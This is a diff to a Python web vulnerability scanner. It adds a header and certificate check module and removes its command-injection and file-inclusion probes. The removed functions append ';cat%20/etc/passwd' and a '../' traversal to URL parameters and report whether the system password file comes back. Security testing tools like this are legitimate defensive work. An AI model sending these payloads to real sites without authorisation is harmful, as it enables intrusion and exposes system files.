@@ -18,6 +18,7 @@ from CORE.clickjacking import test_for_clickjacking
 from CORE.directoryTraversal import directoryTraversal
 from CORE.xss import xss
 from CORE.sensitive_info import scan_for_sensitive_data
+from CORE.headers_certificates import *
 # Disable insecure request warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -31,63 +32,6 @@ url = ""
 
 
 
-
-
-
-
-def commandInjection(url, output_file):
-    try:
-        deger = url.find("=")
-        response = url[:deger + 1] + ";cat%20/etc/passwd"
-        sonuc = requests.get(response, verify=False)
-        if "www-data" in sonuc.content:
-            print("[+]Command injection possible, payload: ;cat%20/etc/passwd")
-            print("Response: ", sonuc.content)
-            report = open(output_file, "a")
-            report_toadd = "[+]Command injection possible, payload: ;cat%20/etc/passwd\n"
-            report_toadd += "Response: " + sonuc.content + "\n"
-            report.write(report_toadd)
-            report.close()
-        else:
-            print("[-]Command injection isn't possible, payload: ;cat%20/etc/passwd")
-            print("Response: ", sonuc.content)
-            report = open(output_file, "a")
-            report_toadd = "[-]Command injection isn't possible, payload: ;cat%20/etc/passwd\n"
-            report_toadd += "Response: " + sonuc.content + "\n"
-            report.write(report_toadd)
-            report.close()
-    except:
-        pass
-
-
-
-
-def fileInclude(url, output_file):
-    try:
-        deger = url.find("=")
-        response = url[:deger + 1] + "../../../../../../etc/passwd"
-        sonuc = requests.get(response, verify=False)
-        if "www-data" in sonuc.content:
-            print("[+]File include possible, payload: ../../../../../../etc/passwd")
-            print("Response: ", sonuc.content)
-            report = open(output_file, "a")
-            report_toadd = "[+]File include possible, payload: ../../../../../../etc/passwd\n"
-            report_toadd += "Response: "+sonuc.content+"\n"
-            report.write(report_toadd)
-            report.close()
-        else:
-            print(
-                "[-]File include isn't possible, payload: ../../../../../../etc/passwd")
-            print("Response: ", sonuc.content)
-            report = open(output_file, "a")
-            report_toadd = "[-]File include isn't possible, payload: ../../../../../../etc/passwd\n"
-            report_toadd += "Response: "+sonuc.content+"\n"
-            report.write(report_toadd)
-            report.close()
-    except:
-        pass
-
-        
 
 
 if args:
